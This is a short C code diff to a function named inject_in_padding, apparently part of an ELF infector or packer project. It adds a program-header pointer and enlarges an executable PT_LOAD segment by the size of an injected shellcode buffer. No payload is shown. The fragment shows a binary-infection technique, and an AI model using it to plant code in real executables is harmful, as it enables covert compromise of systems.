@@ -355,6 +355,7 @@ void	inject_in_padding(void *map)
 {
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
  	Elf64_Shdr *shdr = (Elf64_Shdr *)(map + ehdr->e_shoff);
+	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
 
 
 	const char *sh_strtab = map + shdr[ehdr->e_shstrndx].sh_offset;
@@ -397,7 +398,7 @@ void	inject_in_padding(void *map)
         if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) 
 		{
 			phdr[i].p_filesz += sizeof(shellcode);
-			phdr[i].p_memsz  += sizeof(shellcode);
+			 phdr[i].p_memsz  += sizeof(shellcode);
 		}
 	}
 }
